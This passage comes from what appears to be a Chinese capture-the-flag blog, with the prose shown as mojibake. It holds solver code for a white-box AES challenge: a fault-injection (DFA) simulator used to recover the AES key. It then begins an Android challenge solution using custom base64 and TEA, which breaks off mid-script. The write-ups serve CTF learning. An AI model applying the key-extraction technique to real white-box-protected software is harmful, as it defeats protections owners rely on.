class="number">0x75</span>, <span class="number">0x20</span>, <span class="number">0x06</span>,</span><br><span class="line">        <span class="number">0x32</span>, <span class="number">0xE3</span>, <span class="number">0xD0</span>, <span class="number">0x66</span>, <span class="number">0xB8</span>, <span class="number">0x7D</span>, <span class="number">0xFC</span>, <span class="number">0x90</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> decrypted1[<span class="number">16</span>];</span><br><span class="line">    <span class="type">uint8_t</span> decrypted2[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è§£å¯†ç¬¬ä¸€éƒ¨åˆ†</span></span><br><span class="line">    decrypt_data(encrypted_data1, decrypted1, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è§£å¯†ç¬¬äºŒéƒ¨åˆ†</span></span><br><span class="line">    decrypt_data(encrypted_data2, decrypted2, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¡ç®—ç”¨äºè§£å¯†çš„CRC32å¯†é’¥</span></span><br><span class="line">    <span class="type">uint32_t</span> key = <span class="number">0x6C6F7665</span>;</span><br><span class="line">    <span class="type">uint32_t</span> crc_key = calculate_crc32(&amp;key, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;åŸå§‹å¯†é’¥: 0x%08X\n&quot;</span>, key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CRC32å¯†é’¥: 0x%08X\n\n&quot;</span>, crc_key);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;è§£å¯†ç»“æœ1 (HEX): &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, decrypted1[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;è§£å¯†ç»“æœ2 (HEX): &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, decrypted2[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;å®Œæ•´è§£å¯†ç»“æœ (HEX): &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, decrypted1[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, decrypted2[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°è¯•è§£é‡Šä¸ºå­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ä½œä¸ºå­—ç¬¦ä¸²:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;éƒ¨åˆ†1: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (decrypted1[i] &gt;= <span class="number">32</span> &amp;&amp; decrypted1[i] &lt;= <span class="number">126</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, decrypted1[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;éƒ¨åˆ†2: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (decrypted2[i] &gt;= <span class="number">32</span> &amp;&amp; decrypted2[i] &lt;= <span class="number">126</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, decrypted2[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;å®Œæ•´å­—ç¬¦ä¸²: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (decrypted1[i] &gt;= <span class="number">32</span> &amp;&amp; decrypted1[i] &lt;= <span class="number">126</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, decrypted1[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (decrypted2[i] &gt;= <span class="number">32</span> &amp;&amp; decrypted2[i] &lt;= <span class="number">126</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, decrypted2[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€šç”¨è§£å¯†å‡½æ•°ï¼Œå¯ä»¥å¤„ç†ä»»æ„é•¿åº¦çš„æ•°æ®</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">general_decrypt</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *encrypted, <span class="type">uint8_t</span> *decrypted, <span class="type">size_t</span> length, <span class="type">uint32_t</span> key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> crc_key = calculate_crc32(&amp;key, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n=== è¯¦ç»†è§£å¯†è¿‡ç¨‹ ===\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;åŸå§‹å¯†é’¥: 0x%08X\n&quot;</span>, key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CRC32å¯†é’¥: 0x%08X\n&quot;</span>, crc_key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;å¯†é’¥å­—èŠ‚: [0x%02X, 0x%02X, 0x%02X, 0x%02X]\n\n&quot;</span>,</span><br><span class="line">           (crc_key &gt;&gt; <span class="number">0</span>) &amp; <span class="number">0xFF</span>, (crc_key &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>,</span><br><span class="line">           (crc_key &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>, (crc_key &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint8_t</span> key_byte = (crc_key &gt;&gt; (<span class="number">8</span> * (i &amp; <span class="number">3</span>))) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        decrypted[i] = encrypted[i] ^ key_byte;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ä½ç½®%2zu: 0x%02X ^ 0x%02X = 0x%02X (&#x27;%c&#x27;)\n&quot;</span>,</span><br><span class="line">               i, encrypted[i], key_byte, decrypted[i],</span><br><span class="line">               (decrypted[i] &gt;= <span class="number">32</span> &amp;&amp; decrypted[i] &lt;= <span class="number">126</span>) ? decrypted[i] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nå®Œæ•´HEXç»“æœ: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, decrypted[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç»“æœä¹‹åç™½ç›’ aes çš„å¯†æ–‡ï¼Œä»€ä¹ˆæ˜¯ç™½ç›’ aesï¼Œè¯·çœ‹ä¸‹é¢ 2 ç¯‡æ–‡ç« </p><p><a href="https://bbs.kanxue.com/thread-254042.htm">https://bbs.kanxue.com/thread-254042.htm</a></p><p><a href="https://bbs.kanxue.com/thread-285052.htm">https://bbs.kanxue.com/thread-285052.htm</a></p><p>æ ¸å¿ƒåŠ å¯†ä¸æ™®é€šçš„ aes æ²¡æœ‰åŒºåˆ«ï¼Œå°±æ˜¯ tyibox çš„æ•°æ®æ¯”è¾ƒå¤§ï¼Œçœ‹çš„è®©äººæœ‰ç‚¹è¿·ç³Šï¼Œé¢˜ä¸­åˆä½¿ç”¨äº† nibble å†™æ³•ï¼Œä½¿å¾—æ›´åŠ éš¾ä»¥é˜…è¯»åˆ†æã€‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/202507301006657.png" alt="image-20250730100629626"></p><p>æ•´ç†ä¹‹åå†™è„šæœ¬è¿›è¡Œæ¨¡æ‹Ÿè¿›è¡Œ dfa æ³¨å…¥å¯ä»¥å¾—åˆ° fault æ•°æ®</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> u8;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> u32;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shiftRows</span><span class="params">(u8 state[<span class="number">16</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    u8 tmp = state[<span class="number">1</span>];</span><br><span class="line">    state[<span class="number">1</span>] = state[<span class="number">5</span>];</span><br><span class="line">    state[<span class="number">5</span>] = state[<span class="number">9</span>];</span><br><span class="line">    state[<span class="number">9</span>] = state[<span class="number">13</span>];</span><br><span class="line">    state[<span class="number">13</span>] = tmp;</span><br><span class="line">    tmp = state[<span class="number">2</span>];</span><br><span class="line">    state[<span class="number">2</span>] = state[<span class="number">10</span>];</span><br><span class="line">    state[<span class="number">10</span>] = tmp;</span><br><span class="line">    tmp = state[<span class="number">6</span>];</span><br><span class="line">    state[<span class="number">6</span>] = state[<span class="number">14</span>];</span><br><span class="line">    state[<span class="number">14</span>] = tmp;</span><br><span class="line">    tmp = state[<span class="number">15</span>];</span><br><span class="line">    state[<span class="number">15</span>] = state[<span class="number">11</span>];</span><br><span class="line">    state[<span class="number">11</span>] = state[<span class="number">7</span>];</span><br><span class="line">    state[<span class="number">7</span>] = state[<span class="number">3</span>];</span><br><span class="line">    state[<span class="number">3</span>] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u32 tyibox[<span class="number">10</span>][<span class="number">16</span>][<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">u8 tbox[<span class="number">16</span>][<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">aes_encrypt_by_table</span><span class="params">(u8 input[<span class="number">16</span>], <span class="type">int</span> isDFA)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    u32 a, b, c, d;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (isDFA &amp;&amp; i == <span class="number">8</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            input[index] = <span class="number">0x33</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">shiftRows</span>(input);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            a = tyibox[i][<span class="number">4</span> * j + <span class="number">0</span>][input[<span class="number">4</span> * j + <span class="number">0</span>]];</span><br><span class="line">            b = tyibox[i][<span class="number">4</span> * j + <span class="number">1</span>][input[<span class="number">4</span> * j + <span class="number">1</span>]];</span><br><span class="line">            c = tyibox[i][<span class="number">4</span> * j + <span class="number">2</span>][input[<span class="number">4</span> * j + <span class="number">2</span>]];</span><br><span class="line">            d = tyibox[i][<span class="number">4</span> * j + <span class="number">3</span>][input[<span class="number">4</span> * j + <span class="number">3</span>]];</span><br><span class="line"></span><br><span class="line">            input[<span class="number">4</span> * j + <span class="number">0</span>] = (a &gt;&gt; <span class="number">24</span>) ^ (b &gt;&gt; <span class="number">24</span>) ^ (c &gt;&gt; <span class="number">24</span>) ^ (d &gt;&gt; <span class="number">24</span>);</span><br><span class="line">            input[<span class="number">4</span> * j + <span class="number">1</span>] = (a &gt;&gt; <span class="number">16</span>) ^ (b &gt;&gt; <span class="number">16</span>) ^ (c &gt;&gt; <span class="number">16</span>) ^ (d &gt;&gt; <span class="number">16</span>);</span><br><span class="line">            input[<span class="number">4</span> * j + <span class="number">2</span>] = (a &gt;&gt; <span class="number">8</span>) ^ (b &gt;&gt; <span class="number">8</span>) ^ (c &gt;&gt; <span class="number">8</span>) ^ (d &gt;&gt; <span class="number">8</span>);</span><br><span class="line">            input[<span class="number">4</span> * j + <span class="number">3</span>] = a ^ b ^ c ^ d;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">shiftRows</span>(input);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[j] = tbox[j][input[j]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> input1[<span class="number">17</span>] = &#123;<span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>&#125;;</span><br><span class="line">    <span class="built_in">aes_encrypt_by_table</span>(input1, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>, input1[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> input[<span class="number">17</span>] = &#123;<span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>&#125;;</span><br><span class="line">        <span class="built_in">aes_encrypt_by_table</span>(input, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>, input[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        index++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ° fault æ•°æ®ä¹‹åå¯ä»¥è¿›è¡Œç”¨ phonexAES è¿›è¡Œè§£å¯†å¾—åˆ°æœ€åä¸€è½®çš„è½®å¯†é’¥ï¼Œ</p><p>å†æ ¹æ®è½®å¯†é’¥ä½¿ç”¨ aes_keyschedule åæ¨å›åŸå§‹å¯†é’¥ã€‚</p><p>æœ€åæŠŠå¯†é’¥å’Œå¯†æ–‡æ‰”è¿›å¨å­é‡Œè¿›è¡Œè§£å¯†ã€‚</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/202507301010883.png" alt="image-20250730101028822"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ç™½ç›’AES </tag>
            
            <tag> AES </tag>
            
            <tag> das25 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Androidã€‘ã€æ”»é˜²ä¸–ç•Œã€‘easy-app</title>
      <link href="/2025/07/16/%E3%80%90Android%E3%80%91%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91easy-app/"/>
      <url>/2025/07/16/%E3%80%90Android%E3%80%91%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91easy-app/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€Androidã€‘ã€æ”»é˜²ä¸–ç•Œã€‘easy-app"><a href="#ã€Androidã€‘ã€æ”»é˜²ä¸–ç•Œã€‘easy-app" class="headerlink" title="ã€Androidã€‘ã€æ”»é˜²ä¸–ç•Œã€‘easy-app"></a>ã€Androidã€‘ã€æ”»é˜²ä¸–ç•Œã€‘easy-app</h1><p>ä¸€å¼€å§‹æƒ³ç”¨idaè¿›è¡ŒåŠ¨è°ƒï¼Œä½†æ˜¯å¤±è´¥äº†</p><p>ä¸¢è¿›jadxå‘ç°å…¶ä¸»è¦flagæ£€æŸ¥é€»è¾‘éƒ½åœ¨nativeå±‚ä¸­</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/202507161635574.png" alt="image-20250716163557528"></p><p>äºæ˜¯å°±ç›´æ¥å»nativeå±‚æŸ¥çœ‹ï¼Œæœ‰ç‚¹ç¹æ‚ï¼Œå…ˆä»checkå¼€å§‹æŸ¥çœ‹ï¼šæœ€åè¿›è¡Œäº†ä¸€æ¬¡base64</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/202507161638081.png" alt="image-20250716163826057"></p><p>base64æ˜¯é­”æ”¹base64ï¼Œæ¢è¡¨+å¯†æ–‡æ¢ä½ï¼ŒåŠ å…¥æ­£å¸¸çš„baseå¯†æ–‡æ˜¯0123ï¼Œè¿™ä¸ªå¯†æ–‡å°±æ˜¯2013</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/202507161652564.png" alt="image-20250716165217544"></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/202507161650813.png" alt="image-20250716165026790"></p><p>æ‰€ä»¥è§£base64çš„æ—¶å€™éœ€è¦è¿›è¡Œæ¢ä½ç½®ç„¶åè§£æ­£å¸¸çš„base64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">ENCODED_STR = <span class="string">&quot;e)n*pNe%PQy!^oS(@HtkUu+Cd$#hmmK&amp;ieytiWwYkIA=&quot;</span></span><br><span class="line">TEA_KEY = [<span class="number">0x42</span>, <span class="number">0x37</span>, <span class="number">0x2c</span>, <span class="number">0x21</span>]  <span class="comment"># å®é™…æ˜¯4å­—èŠ‚å¯†é’¥</span></span><br><span class="line">DELTA = <span class="number">0x9E3779B9</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰©å±•å¯†é’¥ä¸º4ä¸ª32ä½æ•´æ•° (å°ç«¯åº)</span></span><br><span class="line">k = struct.unpack(<span class="string">&quot;&lt;4I&quot;</span>, <span class="built_in">bytes</span>(TEA_KEY * <span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tea_decrypt_block</span>(<span class="params">v0, v1, k</span>):</span><br><span class="line">    total = DELTA * <span class="number">32</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 = (v1 - (((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + total) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>])) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">        v0 = (v0 - (((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + total) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>])) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">        total = (total - DELTA) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> v0, v1</span><br><span class="line"></span><br><span class="line"><span class="comment"># è‡ªå®šä¹‰ç¼–ç è¡¨</span></span><br><span class="line">custom_table = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz!@#$%^&amp;*()ABCDEFGHIJKLMNOPQRSTUVWXYZ+/&quot;</span></span><br><span class="line">standard_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. é‡æ’ç´¢å¼•é¡ºåº [1,2,0,3] -&gt; [0,1,2,3]</span></span><br><span class="line"><span class="comment"># å°†æ¯4ä¸ªå­—ç¬¦ä¸€ç»„çš„é¡ºåºä» [ç´¢å¼•1, ç´¢å¼•2, ç´¢å¼•0, ç´¢å¼•3] é‡æ’ä¸º [ç´¢å¼•0, ç´¢å¼•1, ç´¢å¼•2, ç´¢å¼•3]</span></span><br><span class="line">reordered_str = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ENCODED_STR), <span class="number">4</span>):</span><br><span class="line">    group = ENCODED_STR[i:i+<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(group) == <span class="number">4</span>:</span><br><span class="line">        <span class="comment"># é‡æ’é¡ºåºï¼šåŸä½ç½®2-&gt;æ–°ä½ç½®0, åŸä½ç½®0-&gt;æ–°ä½ç½®1, åŸä½ç½®1-&gt;æ–°ä½ç½®2, åŸä½ç½®3-&gt;æ–°ä½ç½®3</span></span><br><span class="line">        reordered_str += group[<span class="number">2</span>] + group[<span class="number">0</span>] + group[<span class="number">1</span>] + group[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        reordered_str += group</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. æ˜ å°„è‡ªå®šä¹‰è¡¨åˆ°æ ‡å‡†è¡¨</span></span><br><span class="line">translated_str = <span 